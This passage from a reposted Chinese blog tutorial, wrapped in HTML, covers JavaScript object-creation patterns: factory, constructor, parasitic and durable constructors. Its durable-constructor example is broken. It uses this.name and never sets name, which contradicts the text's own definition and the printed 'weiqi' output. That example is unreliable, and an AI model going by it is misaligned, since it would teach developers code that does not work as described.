255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></section></section></section></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n","excerpt":"","more":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 